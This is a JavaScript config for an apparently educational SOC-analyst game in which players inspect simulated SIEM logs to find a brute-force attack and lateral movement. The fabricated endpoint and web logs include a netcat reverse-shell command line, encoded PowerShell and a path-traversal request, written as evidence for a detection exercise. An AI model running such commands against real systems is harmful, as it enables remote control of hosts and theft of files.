/* ================================================================
   LOG-ANALYSIS-01: Signal in the Noise — Config
   ================================================================
   SOC analyst mission. Navigate a SIEM environment visiting 8 log
   source nodes. Commands: logs, filter, correlate, alert.
   Objectives: discover 5 sources, find brute-force, correlate
   lateral movement, file a detection alert.
   ================================================================ */

var LOG_ANALYSIS_01_CONFIG = {
    id: 'log-analysis-01',
    missionTitle: 'LOG-01',
    title: 'Signal in the Noise',
    subtitle: 'Investigate SIEM alerts and correlate attack patterns.',
    category: 'log-analysis',
    difficulty: 2,
    inputMode: 'terminal',
    promptText: 'analyst@siem:~$ ',
    promptLabel: 'OPERATOR TERMINAL',

    briefing: [
        'SIEM is flagging multiple alerts from a single source IP.',
        'Visit log nodes, filter for evidence, correlate sources,',
        'and file a detection alert when the attack is confirmed.'
    ],

    customState: {
        logsViewed: [],
        bruteForceFound: false,
        lateralFound: false,
        alertFiled: false
    },

    statusFields: [
        { key: 'bruteForceFound', label: 'Brute Force', trueText: 'DETECTED', falseText: 'NOT FOUND' },
        { key: 'lateralFound',    label: 'Lateral Move', trueText: 'CONFIRMED', falseText: 'NOT FOUND' },
        { key: 'alertFiled',      label: 'Alert Filed', trueText: 'YES', falseText: 'NO' }
    ],

    grid: {
        rows: 4,
        cols: 5,
        start: { col: 0, row: 0 },
        cells: [
            ['siem-console', 'empty',        'web-logs',     'auth-logs',     'wall'],
            ['empty',        'dns-logs',     'empty',        'firewall-logs', 'proxy-logs'],
            ['wall',         'mail-logs',    'empty',        'empty',         'wall'],
            ['wall',         'wall',         'endpoint-logs','wall',          'wall']
        ]
    },

    nodes: {
        'siem-console':   { label: 'SIEM',        abbr: 'SIEM', ip: '10.10.0.1',  os: 'Splunk ES 9.1',              ports: [], desc: 'Splunk Enterprise Security -- central log aggregation' },
        'web-logs':       { label: 'WEB-LOGS',    abbr: 'WEB',  ip: '10.10.1.10', os: 'Apache 2.4 / Ubuntu 22.04', ports: [], desc: 'Apache access and error logs' },
        'auth-logs':      { label: 'AUTH-LOGS',   abbr: 'AUTH', ip: '10.10.1.20', os: 'Ubuntu 22.04 LTS',          ports: [], desc: 'PAM and sshd authentication logs' },
        'dns-logs':       { label: 'DNS-LOGS',    abbr: 'DNS',  ip: '10.10.2.5',  os: 'BIND 9.18',                 ports: [], desc: 'DNS query and response logs' },
        'firewall-logs':  { label: 'FW-LOGS',     abbr: 'FWL',  ip: '10.10.2.30', os: 'pfSense 2.7.0',            ports: [], desc: 'pfSense firewall traffic logs' },
        'proxy-logs':     { label: 'PROXY-LOGS',  abbr: 'PRX',  ip: '10.10.2.40', os: 'Squid 5.7',                ports: [], desc: 'Squid proxy access logs' },
        'mail-logs':      { label: 'MAIL-LOGS',   abbr: 'MAIL', ip: '10.10.3.15', os: 'Exchange 2019',            ports: [], desc: 'Exchange mail transport logs' },
        'endpoint-logs':  { label: 'ENDPOINT',    abbr: 'EPT',  ip: '10.10.3.50', os: 'Windows 11 / Sysmon 15',   ports: [], desc: 'Sysmon and Windows Event logs' }
    },

    /* Simulated log entries per node */
    logContent: {
        'siem-console': [
            '[SIEM] 2024-11-14 02:14:08 | ALERT | HIGH   | auth-logs      | Brute force threshold exceeded: 10.10.5.77',
            '[SIEM] 2024-11-14 02:11:33 | ALERT | MEDIUM | firewall-logs  | Port scan detected from 10.10.5.77',
            '[SIEM] 2024-11-14 01:58:17 | ALERT | LOW    | web-logs       | HTTP 500 rate spike on /api/login',
            '[SIEM] 2024-11-14 01:45:02 | ALERT | MEDIUM | dns-logs       | Query to uncategorized external domain',
            '[SIEM] 2024-11-14 01:30:44 | ALERT | HIGH   | endpoint-logs  | Encoded PowerShell execution detected',
            '[SIEM] --- 5 active alerts, 3 unacknowledged ---'
        ],
        'web-logs': [
            '10.10.4.88 - - [14/Nov/2024:01:50:12 +0000] "GET /index.html HTTP/1.1" 200 4523',
            '10.10.4.92 - - [14/Nov/2024:01:51:05 +0000] "POST /api/login HTTP/1.1" 500 312',
            '10.10.4.92 - - [14/Nov/2024:01:51:06 +0000] "POST /api/login HTTP/1.1" 500 312',
            '10.10.5.77 - - [14/Nov/2024:01:55:33 +0000] "GET /admin/config HTTP/1.1" 404 172',
            '10.10.4.11 - - [14/Nov/2024:02:00:01 +0000] "GET /assets/logo.png HTTP/1.1" 200 18204',
            '10.10.5.77 - - [14/Nov/2024:02:01:14 +0000] "GET /../../../etc/passwd HTTP/1.1" 400 0',
            '[error] [pid 1234] mod_security: Rule 941100 triggered \u2014 XSS attempt from 10.10.5.77'
        ],
        'auth-logs': [
            'Nov 14 02:08:01 srv01 sshd[4412]: Accepted publickey for devops from 10.10.4.55 port 52301',
            'Nov 14 02:10:14 srv01 sshd[4501]: Failed password for root from 10.10.5.77 port 41022 ssh2',
            'Nov 14 02:10:16 srv01 sshd[4502]: Failed password for root from 10.10.5.77 port 41088 ssh2',
            'Nov 14 02:10:18 srv01 sshd[4503]: Failed password for root from 10.10.5.77 port 41133 ssh2',
            'Nov 14 02:10:21 srv01 sshd[4504]: Failed password for root from 10.10.5.77 port 41204 ssh2',
            'Nov 14 02:10:24 srv01 sshd[4505]: Failed password for admin from 10.10.5.77 port 41271 ssh2',
            'Nov 14 02:10:27 srv01 sshd[4506]: Failed password for ubuntu from 10.10.5.77 port 41350 ssh2',
            'Nov 14 02:14:07 srv01 sshd[4598]: PAM 6 more authentication failures; 10.10.5.77'
        ],
        'dns-logs': [
            '14-Nov-2024 02:05:03.112 queries: client 10.10.4.88#55123: query: shop.internal A +',
            '14-Nov-2024 02:07:44.008 queries: client 10.10.4.92#60012: query: api.internal A +',
            '14-Nov-2024 02:09:31.774 queries: client 10.10.5.77#49881: query: c2.malware-domain.xyz A +',
            '14-Nov-2024 02:09:31.901 queries: SERVFAIL c2.malware-domain.xyz \u2014 blocked by RPZ policy',
            '14-Nov-2024 02:11:14.223 queries: client 10.10.4.11#53309: query: mail.internal MX +',
            '14-Nov-2024 02:13:07.445 queries: client 10.10.5.77#50024: query: 203.0.113.44.in-addr.arpa PTR +'
        ],
        'firewall-logs': [
            'Nov 14 02:08:12 pfsense filterlog: 4,16,8000,em0,match,block,in,4,0x0,,60,12345,0,DF,6,tcp,60,203.0.113.44,10.10.1.20,41022,22,0',
            'Nov 14 02:10:14 pfsense filterlog: 4,16,8000,em0,match,pass,in,4,0x0,,64,12401,0,DF,6,tcp,64,10.10.5.77,10.10.1.20,41022,22,S',
            'Nov 14 02:12:05 pfsense filterlog: 4,16,8000,em0,match,pass,in,4,0x0,,64,12688,0,DF,6,tcp,64,10.10.5.77,10.10.3.50,22,22,S',
            'Nov 14 02:12:47 pfsense filterlog: 4,16,8000,em0,match,pass,in,4,0x0,,64,12801,0,DF,6,tcp,64,10.10.5.77,10.10.4.10,22,22,S',
            'Nov 14 02:13:30 pfsense filterlog: 4,16,8000,em0,match,pass,in,4,0x0,,64,12950,0,DF,6,tcp,64,10.10.5.77,10.10.4.22,22,22,S',
            '  [NOTE] 10.10.5.77 attempting SSH to multiple internal hosts \u2014 lateral movement pattern'
        ],
        'proxy-logs': [
            '1699926014.441   1234 10.10.4.88 TCP_MISS/200 18432 GET http://updates.ubuntu.com/pool/main/ - DIRECT',
            '1699926122.008    822 10.10.4.92 TCP_MISS/200  5120 GET http://api.github.com/repos/ - DIRECT',
            '1699926355.771      0 10.10.5.77 TCP_DENIED/403    0 GET http://c2.malware-domain.xyz/ - DIRECT',
            '1699926401.224   2001 10.10.4.11 TCP_MISS/200 92048 GET http://packages.microsoft.com/ - DIRECT',
            '1699926503.889    441 10.10.5.77 TCP_DENIED/403    0 CONNECT pastebin.com:443 - DIRECT',
            '  [POLICY] 2 requests from 10.10.5.77 denied by security policy'
        ],
        'mail-logs': [
            '2024-11-14 01:45:03 SMTP: Message-ID=<msg001@corp.internal> from=hr@corp.internal to=all@corp.internal size=2048 status=Delivered',
            '2024-11-14 01:52:17 SMTP: Message-ID=<phish992@unknown.xyz> from=noreply@helpdesk-corp.xyz to=cfo@corp.internal size=1240 status=Quarantined',
            '2024-11-14 01:52:17 TRANSPORT: Attachment blocked \u2014 invoice_Q4.exe blocked by policy',
            '2024-11-14 02:00:44 SMTP: Message-ID=<msg002@corp.internal> from=dev@corp.internal to=team@corp.internal size=512 status=Delivered',
            '2024-11-14 02:05:09 SMTP: Message-ID=<msg003@corp.internal> from=soc@corp.internal to=all@corp.internal size=890 status=Delivered',
            '  [WARN] Phishing attempt quarantined at 01:52 \u2014 sender domain helpdesk-corp.xyz not in allowlist'
        ],
        'endpoint-logs': [
            '2024-11-14T02:14:01Z EventID=1 ProcessCreate Image=C:\\Windows\\System32\\cmd.exe ParentImage=C:\\Windows\\explorer.exe',
            '2024-11-14T02:14:03Z EventID=1 ProcessCreate Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ParentImage=cmd.exe CommandLine="powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="',
            '2024-11-14T02:14:04Z EventID=3 NetworkConnect SourceIp=10.10.3.50 DestinationIp=10.10.5.77 DestPort=4444 Protocol=tcp',
            '2024-11-14T02:14:09Z EventID=11 FileCreate TargetFilename=C:\\Users\\Public\\nc.exe',
            '2024-11-14T02:14:12Z EventID=1 ProcessCreate Image=C:\\Users\\Public\\nc.exe CommandLine="nc.exe -e cmd.exe 10.10.5.77 4444"',
            '  [ALERT] Base64-encoded PowerShell + netcat execution \u2014 likely post-exploitation activity'
        ]
    },

    traps: [],
    gates: {},

    objectives: [
        { id: 'sources',  label: 'LOG SOURCES DISCOVERED -- 5 log nodes visited',                          check: 'nodesDiscovered.size >= 5' },
        { id: 'brute',    label: 'BRUTE FORCE EVIDENCE -- attack pattern identified in auth logs',         check: 'bruteForceFound' },
        { id: 'lateral',  label: 'LATERAL MOVEMENT CORRELATED -- attacker IP confirmed across sources',    check: 'lateralFound' },
        { id: 'alert',    label: 'DETECTION ALERT FILED -- threat documented in SIEM',                     check: 'alertFiled' }
    ],

    integrity: 3,

    completion: {
        title: 'SIGNAL IN THE NOISE',
        subtitle: 'Threat detected. Alert filed.',
        storageKey: 'hexworth_operator_loganalysis01'
    },

    /* ----------------------------------------------------------------
       Terminal Commands
       ---------------------------------------------------------------- */
    terminalCommands: {
        'logs': {
            help: 'View log entries at current node',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var ct = c.grid.cells[s.position.row][s.position.col];
                if (ct === 'empty' || ct === 'wall') { e.printLine('No log source here.', 'error'); return; }
                var info = c.nodes[ct], entries = c.logContent[ct];
                e.printLine('', 'system');
                e.printLine('\u2550\u2550\u2550 ' + info.label + ' (' + info.ip + ') \u2550\u2550\u2550', 'heading');
                e.printLine('OS: ' + info.os, 'node-info');
                e.printLine('', 'system');
                for (var i = 0; i < entries.length; i++) {
                    var line = entries[i];
                    if (line.indexOf('10.10.5.77') !== -1 || line.indexOf('ALERT') !== -1 || line.indexOf('[WARN]') !== -1) e.printLine(line, 'warning');
                    else if (line.indexOf('[NOTE]') !== -1 || line.indexOf('[POLICY]') !== -1) e.printLine(line, 'node-info');
                    else e.printLine(line, 'info');
                }
                if (s.logsViewed.indexOf(ct) === -1) s.logsViewed.push(ct);
                e.saveState();
            }
        },

        'filter': {
            help: 'Search current node logs for a keyword',
            syntax: 'filter <keyword>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: filter <keyword>', 'error'); return; }
                var ct = c.grid.cells[s.position.row][s.position.col];
                if (ct === 'empty' || ct === 'wall') { e.printLine('No log source here.', 'error'); return; }
                var keyword = args.join(' ').toLowerCase(), entries = c.logContent[ct];
                var matches = [];
                for (var i = 0; i < entries.length; i++) if (entries[i].toLowerCase().indexOf(keyword) !== -1) matches.push(entries[i]);
                e.printLine('', 'system');
                e.printLine('filter "' + keyword + '" on ' + c.nodes[ct].label + ':', 'heading');
                e.printLine('', 'system');
                if (!matches.length) { e.printLine('No matches.', 'system'); return; }
                for (var j = 0; j < matches.length; j++) e.printLine(matches[j], matches[j].indexOf('10.10.5.77') !== -1 ? 'warning' : 'info');
                e.printLine(matches.length + ' match(es).', 'node-info');
                // Brute-force detection
                if (ct === 'auth-logs' && (keyword.indexOf('fail') !== -1 || keyword.indexOf('password') !== -1 || keyword.indexOf('10.10.5.77') !== -1)) {
                    if (!s.bruteForceFound) {
                        s.bruteForceFound = true;
                        e.printLine('', 'system');
                        e.printLine('[!] BRUTE FORCE PATTERN DETECTED', 'warning');
                        e.printLine('IP 10.10.5.77: 6+ failed SSH attempts.', 'warning');
                        e.checkObjectives();
                    }
                }
                e.saveState();
            }
        },

        'correlate': {
            help: 'Cross-reference two log sources',
            syntax: 'correlate <nodeA> <nodeB>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (args.length < 2) { e.printLine('Usage: correlate <nodeA> <nodeB>', 'error'); return; }
                var nodeA = e.resolveNode(args[0]), nodeB = e.resolveNode(args[1]);
                if (!nodeA) { e.printLine('Unknown node: ' + args[0], 'error'); return; }
                if (!nodeB) { e.printLine('Unknown node: ' + args[1], 'error'); return; }
                if (nodeA.visibility !== 'visited') { e.printLine(nodeA.info.label + ' not visited.', 'warning'); return; }
                if (nodeB.visibility !== 'visited') { e.printLine(nodeB.info.label + ' not visited.', 'warning'); return; }
                var pair = [nodeA.type, nodeB.type].sort().join('+');
                e.printLine('', 'system');
                e.printLine('\u2550\u2550\u2550 CORRELATE: ' + nodeA.info.label + ' + ' + nodeB.info.label + ' \u2550\u2550\u2550', 'heading');
                e.printLine('', 'system');
                if (pair === 'auth-logs+firewall-logs') {
                    e.printLine('[AUTH]  02:10-02:14 | 6x Failed SSH from 10.10.5.77', 'warning');
                    e.printLine('[FW]    02:12:05 | 10.10.5.77 -> 10.10.3.50 :22  <-- PIVOT', 'warning');
                    e.printLine('[FW]    02:12:47 | 10.10.5.77 -> 10.10.4.10 :22  <-- LATERAL', 'warning');
                    e.printLine('[FW]    02:13:30 | 10.10.5.77 -> 10.10.4.22 :22  <-- LATERAL', 'warning');
                    e.printLine('', 'system');
                    e.printLine('[!] LATERAL MOVEMENT CONFIRMED', 'success');
                    if (!s.lateralFound) { s.lateralFound = true; e.checkObjectives(); }
                } else {
                    e.printLine('Cross-reference analysis complete. Overlapping data noted.', 'info');
                }
                e.saveState();
            }
        },

        'alert': {
            help: 'File a detection alert',
            syntax: 'alert <description>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state;
                if (!args.length) { e.printLine('Usage: alert <description>', 'error'); return; }
                var text = args.join(' ');
                e.printLine('', 'system');
                e.printLine('[ALERT FILED]', 'heading');
                e.printLine('Description: ' + text, 'info');
                e.printLine('Severity: HIGH', 'warning');
                e.printLine('Status: OPEN', 'success');
                if (!s.alertFiled) { s.alertFiled = true; e.checkObjectives(); }
                e.saveState();
            }
        }
    }
};
